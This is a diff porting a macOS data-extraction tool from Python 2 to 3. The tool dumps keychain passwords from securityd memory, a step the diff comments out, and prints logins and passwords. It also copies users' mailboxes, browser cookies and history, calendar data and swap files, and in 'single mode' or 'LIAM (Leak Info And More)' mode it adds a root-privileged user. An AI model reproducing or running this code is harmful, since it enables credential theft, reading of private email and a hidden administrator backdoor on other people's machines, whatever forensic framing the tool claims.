-		res_jusso_dump=os.popen(dir_path_juuso + "keychaindump " + file_current_keychain).read()
-		fct_writefile(res_jusso_dump, file_current_keychain_juuso)
-		print_log("[KEYCHAIN_CURRENT_JUUSO] Decrypted Keychain is stored into " + file_current_keychain_juuso)
-		log_dump = "[KEYCHAIN_CURRENT_JUUSO]\nCopy of keychain passwords opened with master keychain in memory to " + file_current_keychain_juuso + "\n"
-		fct_writefile(log_dump, file_log_keychain)
+#	if var_privileges_dump == "rootaccess":
+#		("\n\n[KEYCHAIN_CURRENT_JUUSO] Attempting to identification keychain master key in memory (securityd process) ... ")
+#		res_jusso_dump=os.popen(dir_path_juuso + "keychaindump " + file_current_keychain).read()
+#		fct_writefile(res_jusso_dump, file_current_keychain_juuso)
+#		print_log("[KEYCHAIN_CURRENT_JUUSO] Decrypted Keychain is stored into " + file_current_keychain_juuso)
+#		log_dump = "[KEYCHAIN_CURRENT_JUUSO]\nCopy of keychain passwords opened with master keychain in memory to " + file_current_keychain_juuso + "\n"
+#		fct_writefile(log_dump, file_log_keychain)
 
 		#print and record keychain password
-		file = open(file_current_keychain_juuso,'r')
-		lines_juuso = file.readlines()
-		file.close()
-	
-		for i in range(len(lines_juuso)):
-			filtre = re.compile('^(.+)\:(.+)\:(.+)',re.IGNORECASE)
-			res = filtre.findall(lines_juuso[i])
-			for j in res:
-				var_login = j[0]
-				var_pass = j[2]
-				var_target = j[1]
-				
-				print_green("Target: " + var_target.strip("\""))
-				fct_writefile("\nTarget: " + var_target.strip("\"")+"\n", file_current_keychain_juuso_pass)
-				
-				print_green("Login: " + var_login.strip("\""))
-				fct_writefile("Login: " + var_login.strip("\"")+"\n", file_current_keychain_juuso_pass)
-				
-				print_green("Password: " + var_pass.strip("\"") + "\n")
-				#print_green("Password: XXXXXXXXXXXXXXXXXXXX" + "\n")
-				fct_writefile("Password: " + var_pass.strip("\"")+"\n", file_current_keychain_juuso_pass)
-				
-				fct_add_pass_database(var_pass.strip("\"")+"\n")
+#		file = open(file_current_keychain_juuso,'r')
+#		lines_juuso = file.readlines()
+#		file.close()
 
-		print_log("[\KEYCHAIN_CURRENT_JUUSO] Decrpyted passwords into Keychain are stored into " + file_current_keychain_juuso_pass)
+#		for i in range(len(lines_juuso)):
+#			filtre = re.compile('^(.+)\:(.+)\:(.+)',re.IGNORECASE)
+#			res = filtre.findall(lines_juuso[i])
+#			for j in res:
+#				var_login = j[0]
+#				var_pass = j[2]
+#				var_target = j[1]
+#
+#				print_green("Target: " + var_target.strip("\""))
+#				fct_writefile("\nTarget: " + var_target.strip("\"")+"\n", file_current_keychain_juuso_pass)
+
+#				print_green("Login: " + var_login.strip("\""))
+#				fct_writefile("Login: " + var_login.strip("\"")+"\n", file_current_keychain_juuso_pass)
+
+#				print_green("Password: " + var_pass.strip("\"") + "\n")
+				#print_green("Password: XXXXXXXXXXXXXXXXXXXX" + "\n")
+#				fct_writefile("Password: " + var_pass.strip("\"")+"\n", file_current_keychain_juuso_pass)
+
+#				fct_add_pass_database(var_pass.strip("\"")+"\n")
+
+#		print_log("[\KEYCHAIN_CURRENT_JUUSO] Decrpyted passwords into Keychain are stored into " + file_current_keychain_juuso_pass)
 
 
 ###################################################################################################################################
 										     #[dump all keychains]
 ###################################################################################################################################
 def fct_dump_all_keychain():
-	
+
 	print_red_bold("\n[] Dump Keychain Files")
 	fct_dump_main(db_search_keychain,dir_dump_keychain,file_log_keychain)
 
@@ -1381,7 +1389,7 @@ def fct_dump_email_spot() :
 		fct_dump_main(db_search_email_spot_sl,dir_dump_email_spot,file_log_email_spot)
 	else:
 		fct_dump_main(db_search_email_spot,dir_dump_email_spot,file_log_email_spot)
-	
+
 
 ###################################################################################################################################
 										     #[dump email]
@@ -1401,11 +1409,9 @@ def fct_copy_mbox(action, path_mbox, account_name, dir_dump_email_spec,sub_path)
 		try:
 			shutil.copytree(path_mbox,destination_mbox)
 			print_log("[\\" + action + "] Stored into " + dir_dump_email_spec)
-		except shutil.Error, exc:
-			errors = exc.args[0]
-			for error in errors:
-				src, dst, msg = error
-				print_log("[\\" + var_search.upper() + "] You have not sufficient privileges to dump " + src + ":(")
+		except IOError :
+			print_log("[\\" + var_search.upper() + "] You have not sufficient privileges to dump this file :(")
+			file_available = "0"
 	print_green("========================================================================")
 
 
@@ -1414,8 +1420,8 @@ def fct_dump_email():
 
 	print_red_bold("\n[] Dump content of Emails (mbox files)")
 
-	dump_emails_or_not = raw_input("Do you want copy Mail Boxes (.mbox) ? y/[n] > ")
-	
+	dump_emails_or_not = input("Do you want copy Mail Boxes (.mbox) ? y/[n] > ")
+
 	mbox_available_once = 0
 
 	if dump_emails_or_not == "y" :
@@ -1434,12 +1440,12 @@ def fct_dump_email():
 		for index_user in range(len(lines_username)):
 			username = lines_username[index_user].strip("\n")
 
-			#for each path to email 
+			#for each path to email
 			for index_mail in range(len(lines_mail)):
 				path_mail = lines_mail[index_mail].strip("\n").replace("<USERNAME>",username)
 
 				#dump from mounted volume or target mode
-				if var_privileges_dump == "target": 
+				if var_privileges_dump == "target":
 					path_mail = path_to_HD_target + path_mail
 
 				if os.path.exists(path_mail):
@@ -1449,7 +1455,7 @@ def fct_dump_email():
 					#tab to stored each  mail account
 					tab_mail_box = []
 					path_to_mail = path_mail.replace("<USERNAME>",username)
-					if os.path.isdir(path_to_mail): 
+					if os.path.isdir(path_to_mail):
 						for file in os.listdir(path_to_mail):
 							if "@" in file:
 								tab_mail_box.append(path_to_mail + file)
@@ -1464,14 +1470,14 @@ def fct_dump_email():
 							#for path with domain name (ex : ~/Library/Mail/V2/EWS-XXX\\amalard\@exchange.xxx.com/)
 							path_to_mbox = path_to_mbox.replace("\\\\\\\\","\\\\")
 							path_to_mbox = path_to_mbox.strip("\n")
-							
+
 							#extract name of account
 							filtre = re.compile('\/.*\/(.+)',re.IGNORECASE)
 							res = filtre.findall(path_to_mbox)
 							for account_name in res:
 								print_green("\n========================================================================")
 								print_log("Available Mail Boxes for account " + account_name + " (system user : " + username + ") > ")
-								
+
 								#creation of directory to store results
 								if not os.path.isdir(dir_dump_email):
 									os.makedirs(dir_dump_email)
@@ -1489,25 +1495,25 @@ def fct_dump_email():
 										#recording list of available mbox
 										file_ls_mbox=dir_dump_email_spec + "_ls_mbox.txt"
 										fct_writefile(file + "\n",file_ls_mbox)
-										
+
 								#menu
 								print_log("Dump options :")
 								print_green ("1. Dump all mBox")
 								print_green ("2. Dump special mBox")
 								print_green ("n. See next available mBox")
 								print_green ("c. Do not dump")
-								option_dump = raw_input('Choose an option > ')
-								
+								option_dump = input('Choose an option > ')
+
 								#dump all email
-								
-								if option_dump == "1":						
+
+								if option_dump == "1":
 									#copy of all mbox into local
 									for index_file_mbox in range(len(tab_ls_mbox)):
 										sub_path = "/" + tab_ls_mbox[index_file_mbox]
 										fct_copy_mbox("DUMP_" + tab_ls_mbox[index_file_mbox] +"_EMAILS",path_to_mbox,account_name,dir_dump_email_spec,sub_path)
 
 								#dump special mBox
-								if option_dump == "2": 
+								if option_dump == "2":
 									print_log("\nAvailable Mail Boxes > ")
 									for index_file_mbox in range(len(tab_ls_mbox)):
 										print_green (str(index_file_mbox) + ". " + tab_ls_mbox[index_file_mbox])
@@ -1517,19 +1523,19 @@ def fct_dump_email():
 									empty_box = "1"
 									print_log('Choose Mail Boxes (one per line) and finish with "."')
 									while selected_mbox != ".":
-										selected_mbox=raw_input("> ")
+										selected_mbox=input("> ")
 										try:
-											if selected_mbox != "." and selected_mbox != "" and int(selected_mbox)<len(tab_ls_mbox): 
+											if selected_mbox != "." and selected_mbox != "" and int(selected_mbox)<len(tab_ls_mbox):
 												empty_box = "0"
 												selected_mbox_tab.append(selected_mbox.strip())
 										except ValueError:
 											print_red("\nPlease to choose a valid Mail Box\n")
 
-									if empty_box == "1": 
+									if empty_box == "1":
 										print_log("No selected Mail Box ")
 										continue
 
-									#backup selected mbox 
+									#backup selected mbox
 									for i in range(len(selected_mbox_tab)):
 										name_box = tab_ls_mbox[int(selected_mbox_tab[i])]
 										sub_path = "/" + name_box
@@ -1545,7 +1551,7 @@ def fct_dump_email():
 								#cancel action for this system user
 								else:
 									break
-		if mbox_available_once == 0: 
+		if mbox_available_once == 0:
 			# print_green(========================================================================")
 			print_log("\nNo Mail Box identified\n")
 
@@ -1641,7 +1647,7 @@ def fct_dump_spotlight():
 ###################################################################################################################################
 def fct_dump_hiberswap():
 	print_red_bold("\n[] Dump Hibernation And Swap Files")
-	res=raw_input("Do you want to extract hibernation and swap files ? y/[n] > ")
+	res=input("Do you want to extract hibernation and swap files ? y/[n] > ")
 	if res == "y":
 		fct_dump_main(db_search_hiberswap,dir_dump_hiberswap,file_log_hiberswap)
 
@@ -1702,12 +1708,23 @@ def fct_check_os(var_version):
 	elif var_version == "16" :
 		os_version = "Sierra / 10.12"
 		return(os_version)
-        elif var_version == "17" :
-                os_version = "High Sierra / 10.13"
-                return(os_version)
-        elif var_version == "18" :
-                os_version = "Mojave / 10.14"
-                return(os_version)
+	elif var_version == "17" :
+		os_version = "High Sierra / 10.13"
+		return(os_version)
+	elif var_version == "18" :
+		os_version = "Mojave / 10.14"
+		return(os_version)
+	elif var_version == "19" :
+		os_version = "Catalina / 10.15"
+		return(os_version)
+	elif var_version == "20" :
+		os_version = "Big Sur / 11.6"
+		return(os_version)
+	elif var_version == "21" :
+		os_version = "Monterey / 12.4"
+		return(os_version)
+
+
 	else:
 		print_red("\nUnsupported OS version.")
 		os_version = "Unknown version"
@@ -1723,7 +1740,7 @@ def fct_check_os(var_version):
 ############################################
 
 #dump from mounted volume or target mode
-if var_privileges_dump == "target": 
+if var_privileges_dump == "target":
 	path_to_HD_target = sys.argv[3]
 
 	if not os.path.isdir(root_dir_results):
@@ -1762,10 +1779,10 @@ elif var_privileges_dump == "LIVE":
 #standard mode
 else:
 	os_version = fct_check_os(var_version)
-	if var_privileges_dump == "singlemode": 
+	if var_privileges_dump == "singlemode":
 		print_red_bold("\n                     ====Exploit Single Mode====")
 		print_green("========================================================================")
-		res = raw_input("\nSingle Mode is available in pressing ⌘ + S during system boot \n\nPlease to refer you to readme.txt for using \n\nTricks> Launch script command before to launch single mode to get traces :-) and use scan_typescript.py to view\n\nPress any key to continue or b to back\n")
+		res = input("\nSingle Mode is available in pressing ⌘ + S during system boot \n\nPlease to refer you to readme.txt for using \n\nTricks> Launch script command before to launch single mode to get traces :-) and use scan_typescript.py to view\n\nPress any key to continue or b to back\n")
 		if res == "b":
 			exit()
 	elif var_privileges_dump == "rootaccess":
@@ -1802,30 +1819,30 @@ while selected_mode == "null":
 		print_green("1: Full Dump Mode (investigator mode)")
 		print_green("2: LIAM Mode (Leak Info And More ...)")
 
-		selected_mode = raw_input("\nYour choice (b to back) > ")
+		selected_mode = input("\nYour choice (b to back) > ")
 
-		if selected_mode == "1": 
+		if selected_mode == "1":
 			mode = "FD"
 			var_log = str(datetime.datetime.now()) + ": " + "Full Dump Mode" + " / " + var_privileges_dump + "\n"
 			fct_writefile(var_log, file_history_dest)
-		
-		elif selected_mode == "2": 
+
+		elif selected_mode == "2":
 			mode = "LIAM"
 			var_log = str(datetime.datetime.now()) + ": " + "LIAM Mode" + " / " + var_privileges_dump + "\n"
 			fct_writefile(var_log, file_history_dest)
-		
+
 		elif selected_mode == "b":
 			exit()
-		else: 
+		else:
 			print_red("\nPlease to choose 1 or 2\n")
-			selected_mode = "null"			
+			selected_mode = "null"
 
 	#for single mode => Quick Mode
 	else:
 		var_log=str(datetime.datetime.now()) + ": " + "Single Mode" + "\n"
-		fct_writefile(var_log, file_history_dest) 
+		fct_writefile(var_log, file_history_dest)
 		mode = "FD"
-		selected_mode = "no_null"	
+		selected_mode = "no_null"
 
 
 #create of directory
@@ -1841,7 +1858,7 @@ fct_writefile(var_home, file_current_user)
 #[if single mode]
 if var_privileges_dump == "singlemode":
 	#test if you are root
-	if var_uid != 0 : 
+	if var_uid != 0 :
 		print_red("\nPlease run program with root privileges.\n")
 		sys.exit()
 	fct_load_opendirectoryd()
@@ -1862,8 +1879,8 @@ fct_authentication_dump()
 fct_dump_history_net_sys()
 
 #dump current keychain
-if var_privileges_dump != "singlemode":
-	fct_dump_current_keychain()	
+#if var_privileges_dump != "singlemode":
+#	fct_dump_current_keychain()
 
 #[if root access or single mode]
 if var_privileges_dump == "rootaccess" or var_privileges_dump == "singlemode":
@@ -1879,7 +1896,7 @@ if var_privileges_dump == "rootaccess" or var_privileges_dump == "singlemode":
 type_search=["cookies","places","downloads"]
 for i in range(len(type_search)):
 	fct_dump_secrets_browser(type_search[i])
-		
+
 #calendar dump
 fct_dump_ical()
 
@@ -1925,7 +1942,7 @@ if mode != "LIAM" :
 
 
 #add user with root privileges in Single Mode AND mode LIAM (Leak Info And More)
-if var_privileges_dump == "singlemode" or (var_privileges_dump == "rootaccess" and mode == "LIAM") : 
+if var_privileges_dump == "singlemode" or (var_privileges_dump == "rootaccess" and mode == "LIAM") :
 	fct_add_user_root()
 
 if mode == "LIAM":
@@ -1939,8 +1956,3 @@ if (var_privileges_dump == "rootaccess" and mode != "LIAM") or var_privileges_du
 	fct_dump_hiberswap()
 
 os.system('chmod -Rf 777 ' + dir_results)
-
-
-
-
-
